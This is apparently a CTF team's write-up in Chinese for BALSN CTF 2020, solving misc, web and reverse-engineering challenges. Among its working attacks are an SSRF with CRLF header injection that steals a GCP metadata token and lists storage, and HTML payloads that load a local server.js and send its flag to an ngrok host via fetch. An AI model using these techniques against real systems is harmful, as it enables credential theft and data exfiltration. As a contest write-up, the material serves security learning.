# BALSN CTF write-up
###### tags: `NCtfU💩`
[toc]
## [Misc] Show your Patience and Intelligence I

### part 1
長時間曝光 or 直接使用工具將六塊面板亮過的地方記錄下來, 能得到
![](https://i.imgur.com/nkDi828.png)
![](https://i.imgur.com/0NNNVQF.jpg)
```
_q!fitlboEc
```


### part 2
按照燈亮的持續時間跟間隔, 看起來很像 morse code
```
.   短亮
-   長亮
" " 短暗
|   長暗

.--. -...- -...|..--.- -...- ..--.-|--.- -...- -..
```
解開後得到
```
p=b
_=_
q=d
```

之後照其意思, 水平翻轉 part1 的 key 可以求出
```
_dit!flpoEc
```

### part 3
![](https://i.imgur.com/pqedmAQ.jpg)

紀錄每次發亮時亮的 column 總數, 得到
```
3123213455131232134551673813414912ab92a555
```
然後發現 column 和前面求得的剛好有關，都是 1~11 個長度
因此嘗試寫一個腳本猜測
```python=
#!/usr/bin/env python

flag = '3123213455131232134551673813414912ab92a555'
table = '_dit!flpoEc'

print('BALSN{', end='')
for c in flag:
    print(table[int(c, 16) - 1], end='')
print('}')
```

```
BALSN{i_did_it!!_i_did_it!!_flip_it_to_dEcodE!!!}
```

## [MISC] Show your Patience and Intelligence II
首先找找 VCD 檔室是什麼, 以及找出可以查看 VCD 檔案的工具

根據 https://en.wikipedia.org/wiki/Value_change_dump , VCD 大概就是紀錄 hardware 資料的變化, 並且我們找到一個線上工具 `GTKWare` 能可視化這些 log
![](https://i.imgur.com/12OzRjK.png)

並且在後來順便找了 max7219 使用文件, 想了解他是怎麼產生 VCD 檔案的
[MAX7219 LED dot matrix](https://docs.labs.mediatek.com/resource/linkit7697-arduino/en/tutorial/driving-8x8-dot-matrices-with-max7219)

而當時在手冊中沒有找到有用的資訊, 能做的事就是透過不斷的猜測~~通靈~~, 刪除不可能的方向, 以下為分析結果
- channel 0
	- 過一陣子會有一個波
- channel 8
	- 不固定波型, 不過只要 ch0 有波, 就會切換到下個波型
- channel 1
    - clock signal，每 16 個為一週期
- 在 ch0 切換前, ch8 會重複出現好幾個相同的波, 於是能猜到每對 ch0 波之間的 ch8 波型代表某種意義
- 而 ch8 的波型有長有短, 還有波型有三個峰, 於是猜測每個波為一個 LEB 的 column, 波型中波峰為亮的地方, 至多三個, 畫出以下圖
	- ![](https://i.imgur.com/eYHZQcx.jpg)

	- 因為前面第一個字很明顯有 B 的感覺, 再加上一些直覺, 大概畫出 BAL 的形狀
- 讀取 signal, 根據各個 channel 的 value 分別印出, 可以得到:
```
-------------------------------------------------------  @
   @
    
 @  
    
 @  
    
 @  
    
 @  
    
 @  
    
 @  
    
 @  
    
 @  
    
 @  
    
   @
 @ @
   @
 @ @
   @
 @ @
   @
 @ @
   @
 @ @
   @
 @ @
   @
 @ @
   @
    
...
-------------------------------------------------------  @
   @
    
 @  
    
 @  
    
 @  
    
 @  
    
 @  
    
 @  
    
 @  
    
 @  
    
 @  
    
   @
 @ @
   @
    
 @  
    
 @  
    
   @
 @ @
   @
    
 @  
    
 @  
    
   @
 @ @
   @
...
```
- 看成總共 15 個長度, 有值 (1) 亮的, 一共 15 個 row, 可以畫出
```
@@@@@@@@@@@@@@@
@@@   @@@   @@@
@@@   @@@   @@@
@@@   @@@   @@@
  @@@@@ @@@@@
@@@@@@@@@@@@@
       @@@  @@@
       @@@  @@@
       @@@  @@@
@@@@@@@@@@@@@
.
.
.
```
- 到這步就能知道方向是對的, 而此時有人在手冊找到有用的資訊, 更驗證這樣是對的
- 最後寫了一個 script, 將這些 column 直接印出, 最後附上結果影片:
	- https://www.youtube.com/watch?v=kLePhuKj1y8


#### Script
```python=
with open('./misc2.vcd') as f:
    c_list = f.readlines()

p_list = [-1] * 8
counter = 15
clk_on = 0

for el in c_list:
    temp = el[1]
    if temp == '!':  # channel_0
        if int(el[0]) == 1:
            for p in reversed(p_list):
                print('⬤' if p == 1 else '  ', end='')
        else:
            print()
    elif temp == '$':  # channel_8
        clk_on = int(el[0])
    elif temp == '"':  # channel_1
        if int(el[0]) == 1:
            if counter <= 7:
                p_list[counter] = clk_on
            counter -= 1
            if counter < 0:
                counter = 15


# $var wire 1 ! Channel_0 $end
# $var wire 1 " Channel_1 $end
# $var wire 1 # Channel_7 $end <- useless
# $var wire 1 $ Channel_8 $end
```

#### Output
```
                
  ⬤⬤⬤⬤⬤⬤⬤
  ⬤    ⬤    ⬤
  ⬤    ⬤    ⬤
  ⬤    ⬤    ⬤
    ⬤⬤  ⬤⬤  
  ⬤⬤⬤⬤⬤⬤  
        ⬤    ⬤
        ⬤    ⬤
        ⬤    ⬤
  ⬤⬤⬤⬤⬤⬤  
  ⬤⬤⬤⬤⬤⬤⬤
  ⬤            
  ⬤            
  ⬤            
  ⬤            
  ⬤      ⬤⬤  
  ⬤    ⬤    ⬤
  ⬤    ⬤    ⬤
  ⬤    ⬤    ⬤
    ⬤⬤      ⬤
  ⬤⬤⬤⬤⬤⬤⬤
          ⬤    
        ⬤      
      ⬤        
  ⬤⬤⬤⬤⬤⬤⬤
        ⬤      
    ⬤⬤  ⬤⬤  
  ⬤          ⬤
  ⬤          ⬤
...
```

#### Flag
```
BALSN{I_spent_a_lot_of_time_drawing_leters_QAQ}
```

## [MISC] The Last Bitcon

觀察 run.sh

如果 python raise exception 並且沒有 catch 時，python 會被退出並且回傳 1。

所以可以嘗試讓他發生 UnicodeDecodeError (或者 EOF Error 似乎也是可以) ，之後 python 被退出就會回傳 1 就可以得到 flag

本機可以嘗試驗證該問題的存在
```
Traceback (most recent call last):
  File "pow.py", line 27, in <module>
    x = input('??? = ')
  File "/usr/lib/python3.8/codecs.py", line 322, in decode
    (result, consumed) = self._buffer_decode(data, self.errors, final)
UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte
```


exploit
``` 
python3 -c 'print("\x80")' | nc the-last-bitcoin.balsnctf.com 7123
```

result:
```
ubuntu@ubuntu:~$ python3 -c 'print("\x80")' | nc the-last-bitcoin.balsnctf.com 7123


sha256(AFP0PpQv7D5QiGvJ + ???) == 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000(200)...

??? = There you go:
BALSN{Taiwan_can_help_solve_sha256}
```

## [Misc] Transformer: The Guardian Knight

### Intro
這次提供了兩個檔案 `WAF.js`, `server.js`
```javascript=
//server.js
const fs = require('fs');
const http = require('http');
const assert = require('assert');

const flag = fs.readFileSync('/home/waf/flag').toString().trim();

const port = 8888

assert.ok(flag.match(/^BALSN\{[^}]+\}$/))




const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(`The flag is ${flag}.`);
});


server.listen(port, '127.0.0.1', () => {
    console.log('[*] Listening on ', server.address())
})
```
```javascript=
//WAF.js
const net = require('net');
const { Transform } = require('stream');


const flagPort = 8888
const publicPort = 8889


class WAF extends Transform {
    _transform (data, encoding, callback) {
        data = data.toString('ascii').replace(/BALSN{([^}]*)/g, (m, c) =>
            'BALSN{' + Array(c.length).fill('REDACTED_').join('').slice(0, c.length)
        )
        callback(null, data)
    }
};


const server = net.createServer(toc => {
    const tos = net.createConnection({port: flagPort}, () => {
        toc.pipe(tos).pipe(new WAF()).pipe(toc)
    })
    toc.on('error', e => { toc.destroy(); tos.destroy() })
    tos.on('error', e => { toc.destroy(); tos.destroy() })
})


server.listen(publicPort, '0.0.0.0', () => {
    console.log('[*] Listening on ', server.address());
});
```

所以可以知道 `server.js` 是開在內網，並且與題目沒什麼關聯。

我們一開始看的重點主要就在 `WAF.js` 內實作的 `_transform`，當初在閱讀[官方文件](https://nodejs.org/api/stream.html#stream_transform_transform_chunk_encoding_callback)時看到有兩句挺有趣的
```
The transform.push() method may be called zero or more times
to generate output from a single input chunk, depending on how much 
is to be output as a result of the chunk.
```
```
transform._transform() is never called in parallel; streams 
implement a queue mechanism, and to receive the next chunk,
callback must be called, either synchronously or asynchronously.
```
那當流量大的時候，是不是 callback 有機會將尚未 transform 完全的資料 push 出去呢

### Exploit
```python=
#!/usr/bin/env python

from pwn import *
import requests
import re

balsn = re.compile(r'BALSN{[^}]*}')

payload = ''.join(('GET / HTTP/1.1\r\n\r\n' for _ in range(150000)))

r = remote('waf.balsnctf.com', 8889)
r.sendline(payload)
data = r.recvall()
qq = balsn.findall(data.decode())

for i in qq:
    if i != "BALSN{REDACTED_REDACTED_REDAC}":
        print(i)
```
然後執行
```
python3 payload.py | grep -Pv 'Receiving|REDACTED'
```


Result: 
![](https://i.imgur.com/lH26NGx.png)
<!--![](https://i.imgur.com/ukfRlge.png) -->

(P.S. 在結束後自己重現時發現若一開始的 flag 太短的話，還是有機會 被 redacted。所以一開始的猜測似乎是正確的，)

## [Web] tpc
### 前言
有使用 GCP 並且深入研究過的人，都會知道 GCP 是建立在 Docker image 上，所以討論方向都跟 docker 無關
1. 嘗試請求 file:///etc/passwd 知道有 SSRF(兼LFI)以後，file:///etc/hosts 了解網路環境並得知 這是一台 GCP, 因此研究方向則是 information leak, 資訊：169.254.169.254 metadata.google.internal metadata
2. 竊取 token, http://35.194.175.80:8000/query?site=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%20HTTP/1.1%0D%0AMetadata-Flavor:Google%0D%0ANo:
3. 透過 token 存取 storage google api
 
### 解法
透過 LFI 的漏洞查看 `/proc/self/cmdline` 以及 `/proc/self/environ`, 得到 source code path `/opt/workdir/main-dc1e2f5f7a4f359bb5ce1317a.py` 以及 PWD 為 `/opt/workdir`, 得知 flag 應該位於 `/opt/workdir/` 下, 因此我們的目標要**想辦法取得此資料夾下的資料** or **RCE 直接 `ls`, `cat` 來看**

發現 `/etc/hosts` 中有出現 `169.254.169.254 metadata.google.internal`, 猜測有使用 GCP (google cloud platform) 服務

透過 CVE-2019-9947, 我們可以在請求中塞其他 header
- GCP 規定存取時需要有 `Metadata-Flavor:Google` header
- 在網址後面加上%20HTTP/1.1%0D%0AMetadata-Flavor:Google%0D%0AUNUSELESS:, 會變成:
```
GET: / HTTP/1.1
Metadata-Flavor: Google
UNUSELESS: HTTP/1.1
HOST: XXX.com
...
```
這樣就可以使用 GCP 服務了

> 這邊補充一下如何拿到 proj id 和 token


project id 可以透過以下指令取得
```
curl "http://35.194.175.80:8000/query?site=http://metadata.google.internal/computeMetadata/v1/project/project-id%20HTTP/1.1%0D%0AMetadata-Flavor:Google%0D%0ANo:"
```

token 有時效性，並且可以透過以下方法取得
```
curl "http://35.194.175.80:8000/query?site=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%20HTTP/1.1%0D%0AMetadata-Flavor:Google%0D%0ANo:"
```

到這邊, 我們只能跟 metadata server 要 metadata, 還沒辦法打 API 拿 storage 相關的資料
- 於是查看 manual, 看有啥可以用的 info, 最後找到 token, 可以附在 header, 就能透過 storage server 拿資料了
	- 透過測試跟看文件, 可以知道有了 token, 就能在 local 打 request 了
	- https://storage.googleapis.com/storage/v1/b/bucket/o/object
	- ![](https://i.imgur.com/cUIGEOg.png)

	<!-- - ![](https://i.imgur.com/avlOdGI.png) -->

能使用 storage server, 就會想知道他有哪些資料
- 得知 storage 大概的資料架構為: project name --> bucket --> object, 因為我們有 project name, 所以 bucket 跟 object 都能透過他提供的 api 一層一層找出來
```
curl 'https://storage.googleapis.com/storage/v1/b?project=balsn-ctf-2020-tpc'  -H 'Metadata-Flavor: Google'  -H 'Authorization: Bearer ya29.c.KpcB5Qfr3sZB1YpicEBWAYbv5-hqiMYUjJdz0lF55RPwzcjgoJAfyt484WaNtHkcBLq8_T5auNlTl_LRcNp2viXvqO4AN6Do6X8GEkQOMMqcUiPHJ_gEg-chgEiSzs5mw1M5UoLoxJNFSHMDsqy5YEM-ImifLn5wPsqy6DHMSktUh_BUKkt9LxMNdFKCkMJBHd_HKWNLif1MGA'
```

列舉 object
```
curl 'https://storage.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o' -o QQ  -H 'Metadata-Flavor: Google'  -H 'Authorization: Bearer ya29.c.KpcB5Qfr3sZB1YpicEBWAYbv5-hqiMYUjJdz0lF55RPwzcjgoJAfyt484WaNtHkcBLq8_T5auNlTl_LRcNp2viXvqO4AN6Do6X8GEkQOMMqcUiPHJ_gEg-chgEiSzs5mw1M5UoLoxJNFSHMDsqy5YEM-ImifLn5wPsqy6DHMSktUh_BUKkt9LxMNdFKCkMJBHd_HKWNLif1MGA'
```
![](https://i.imgur.com/ux6qCph.png)


找到 object 的所在處後, 利用他的 medialink, 一個一個存起來
``` python
#!/usr/bin/env python
import json, os
import requests

print('get token')
get_token = requests.get("http://35.194.175.80:8000/query?site=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%20HTTP/1.1%0D%0AMetadata-Flavor:Google%0D%0ANo:")
token = get_token.json()["access_token"]
print(token)

print('get obj list')
url = 'https://storage.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o'
headers = {
'Metadata-Flavor': 'Google',
'Authorization': 'Bearer {}'.format(token)
}

jsonData = requests.get(url, headers=headers).json()
count = 0
for medialink in jsonData['items']:
    count += 1
    os.system("curl '{}' -o QQ{} -H 'Metadata-Flavor: Google'  -H 'Authorization: Bearer {}'".format(medialink['mediaLink'], count, token))
```

``` bash
for filename in $(ls)
do
  echo $filename
  tar -tf $filename |grep 'flag'
done
```

- 透過 gzip 解壓縮這些資料, 在某個 object 中發現:
    - ![](https://i.imgur.com/nsLgaoI.png)

成功拿到 flag
```
BALSN{What_permissions_does_the_service_account_need}
```

## [Web] The Woven Web

1. 分析 server 如何 load url -> 透過 chromium
2. 如何得到 server.js 的 flag -> 透過 local 的方式讀取 server.js 
3. 如何在 local 執行我們的 payload.html -> 下載至 local 並透過 file protocol 仔入 payload.html
4. 如何下載到 local -> one click attack
5. payload.html -> 透過 xmlhttprequest/\<script src> server.js 載入 server.js
6. 將 flag 送出來 -> 利用 xmlhttprequest/(fetch/open) 將 flag 往外送

起手勢，我們知道 server 是 js, 如果可以透過 script tag 就可以載入 server.js 則可以把 server.js 中的 FLAG 變數丟出來。

如果 chromium 載入的 url 是外部連結，如: balsnctf.com/payload.html 則無法載入 local file, 所以我們需要在 local 執行一些 payload。

我們可以找到 driver 是 Chromium 去操作 redis 中 queuing 的 url，而 chromium 可以直接下載檔案, 並透過 one click attack 將資料下載到 server

至於怎麼知道 Server 的 download path, 透過 Dockerfile 可以知道使用者是 user, 而 home 位於 /home/user

chromium 預設的 Download path 是 "~/Download" (at-user-home-directory), 所以當檔案可以寫入 filesystem 以後, 我們可以透過 file:///home/user/Download/payload.html 載入 payload

而 payload.html 則會將一些 browser 預設不存在的變數，如：require 則會噴錯, 因此要將這些變數作定義。
定義完可以透過 fetch/open/xmlhttprequest 將 flag 往外部網路的 url 丟，就可以得到 flag

其他資訊分析:
chrome 參數為 `options.addArguments(['--no-sandbox', '--disable-gpu', '--disable-dev-shm-usage']);` 所以可以載檔案下來到 `file://` 跑

download.html
```html
<script>
function download(dataurl, filename) {
  var a = document.createElement("a");
  a.href = dataurl;
  a.setAttribute("download", filename);
  a.click();
}

function makeid(length) {
   var result           = '';
   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}


file_name = Number(new Date).toString(16) + makeid(40) + '.html'

download("http://1441f3aaaabc.ngrok.io/payload.html", file_name);
open("http://the-woven-web.balsnctf.com/?url=file:///home/user/Downloads/" + file_name)

</script>
```

payload.html
```html
<script>
fetch('http://1441f3aaaabc.ngrok.io/hint2123');
function require(nothing) {
  if (nothing == 'redis') {
      return {createClient: console.log};
  }

  if (nothing == 'fs') {
      return {existsSync: console.log};
  }

  return console.log;
}
</script>

<script src="file:////home/user/app/server.js"></script>

<script>
fetch('http://1441f3aaaabc.ngrok.io/hint2');
fetch('http://1441f3aaaabc.ngrok.io/hint2123' + FLAG );

</script>
```

之後在本地的 http 會有 access log ，並且 URL decode 就有 flag 了 

```
BALSN{THe_cRawLEr_Is_cAughT_IN_tHe_wOVeN_wEb}
```

## [Rev] BabyRev

- 用 decompiler（ex: JD-GUI）反編譯 class file，得到原始碼
- 可以看出是用 `Scala` 寫的 
- 從 class `Main$` 的 `main()` 可以看出 flag 是由 a, b 兩個 byte array 經過 xor 得到，其中 a 是已知的，所以重點放在如何產生 b，程式碼如下：

```java=
byte[] b = scala.package..MODULE$.BigInt().apply((long)BoxesRunTime.unboxToInt(
      this.broken().apply(60107)) % (long)Math.pow(2.0D, 62.0D)).toByteArray();

/* pseudo code */
// b = toByteArray(broken()[60107] % pow(2, 62))
```

- 所以要知道 broken 在做什麼，可以從 `Main$` 的 constructor 可以看到

```java=
private Main$() {
  MODULE$ = this;
  Seq What = (Seq)scala.collection.Seq..MODULE$.apply(
      scala.Predef..MODULE$.wrapRefArray((Object[])(new Seq[]{
              (Seq)scala.collection.Seq..MODULE$.apply(scala.Predef..MODULE$.wrapIntArray(new int[]{0, 1, 2, 3})),
              (Seq)scala.collection.Seq..MODULE$.apply(scala.Predef..MODULE$.wrapIntArray(new int[]{0})), 
              (Seq)scala.collection.Seq..MODULE$.apply(scala.Predef..MODULE$.wrapIntArray(new int[]{0})), 
              (Seq)scala.collection.Seq..MODULE$.apply(scala.Predef..MODULE$.wrapIntArray(new int[]{0}))})));
  this.broken = this.com$sces60107$babyrev$Main$$f$1(
      scala.package..MODULE$.Stream().apply(scala.Predef..MODULE$.wrapIntArray(new int[]{0})),
      What);
     
     /* pseudo code*/
     // What = [[0, 1, 2, 3], [0], [0], [0]]
     // broken = com$sces60107$babyrev$Main$$f$1([0], What)
}
```
- 繼續 trace 下去看，會發現有兩個 object 會不斷遞迴，並且每一輪都會產生新的值，接在回傳值後面
- 產生方式大致如下：

```python
## 規則
# 每一輪將所有數字，進行下方的轉換，產生的值為轉換後所有數字的總和
# 0 替換成 0, 1, 2, 3
# 1 替換成 0
# 2 替換成 0
# 3 替換成 0

turn[0] = 0 # 起始值
turn[1] = [0+1+2+3] = 6
turn[2] = [[0+1+2+3]+[0]+[0]+[0]] = 6
turn[3] = [[[0+1+2+3]+[0]+[0]+[0]]+[[0+1+2+3]]+[[0+1+2+3]]+[[0+1+2+3]]] = 24
...
```
- 如此可以得到數列：`[0, 6, 6, 24, 42, 114, 240, 582, 1302, 3048, 6954, 16098, 36960, 85254, 196134, 451896, 1040298, 2395986, 5516880, ...]`
- 將所有數值除以 6 之後，丟 google 可以查到遞迴關係式 https://oeis.org/A006130
- `a(n) = a(n-1) + 3*a(n-2) for n > 1, a(0) = a(1) = 1`
- 所以可以很快算出 `broken()[60107]` 並得到 `b`
- 最後 xor 得到 flag
- 腳本如下：

```python=
a = [71, 20, -82, 84, -45, -4, 25, -122, 77, 63, -107, 13, -111, -43, 43, -42, 96, 38, -88, 20, -67, -40, 79, -108, 77, 8, -75, 80, -45, -69, 25, -116,
     117, 106, -36, 69, -67, -35, 79, -114, 113, 36, -112, 87, -67, -2, 19, -67, 80, 42, -111, 23, -116, -55, 40, -92, 77, 121, -51, 86, -46, -85,  93]
a = [(el + 0x100) if el < 0 else el for el in a]

'''Generate broken[60107]'''
# https://oeis.org/A006130 <- 要乘以 6
t1, t2 = 1 * 6, 1 * 6
for i in range(60107-2):
    t1, t2 = (t1 + 3 * t2) % (2 ** 62), t1

'''Create b from broken[60107]'''
b = hex(t1)[2:]
b = "0" * (len(b) & 1) + b
b = bytes.fromhex(b)

'''a xor b and get the flag'''
print("BALSN{", end='')
for i in range(len(a)):
    print(chr(a[i] ^ b[i % len(b)]), end='')
print("}")
```

Flag
```
BALSN{U_S01ved_this_W4rmUp_R3v_CH411eng!!!_W3lcom3_to_BalsnCTF_2020!!}
```

